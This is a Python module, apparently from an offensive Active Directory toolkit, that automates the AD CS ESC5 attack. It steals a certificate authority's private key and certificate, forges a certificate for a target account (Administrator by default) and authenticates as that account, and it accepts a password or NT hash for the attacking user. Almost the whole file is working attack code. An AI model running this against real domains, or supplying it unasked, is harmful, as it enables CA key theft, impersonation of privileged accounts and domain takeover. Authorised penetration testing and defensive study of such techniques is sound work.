import os

from pathlib import Path
from module import BaseModule
from tool import Tool

class ADCSESC5(BaseModule):
    name = "ADCS - ESC5"
    path = "adcs/esc5"
    description = "ESC5: Vulnerable PKI Object Access Control"
    info = """An attacker can compromise the CA by exploiting overly permissive Access Control Lists (ACLs) on AD CS-related AD objects (e.g., the CA server object itself, certificate template objects). This is a broad category that encompasses other techniques.

Prerequisites:
  - The attacker has write permissions on a sensitive AD CS AD object (e.g., the CA object, certificateTemplate object, the OID object, or the container object)."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        pfx = self.uniq_filename(self.opts.target_account)
        forged_ca = f"{self.opts.ca_name}.pfx"
  
        p12 = Path("pfx.p12")
        if p12.exists():
            p12.unlink()

        tool.title("Backup the compromised CA's private key and certificate")
        if not await tool.certipy_ca(['-backup']):
            return

        tool.title("Forge a certificate for a target user using the CA's key")
        if not await tool.certipy_forge(forged_ca, ['-upn', f"{self.opts.target_account}@{self.opts.domain}", '-crl', 'ldap:///', '-out', pfx]):
            return

        tool.title("Authenticate as the target user with the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
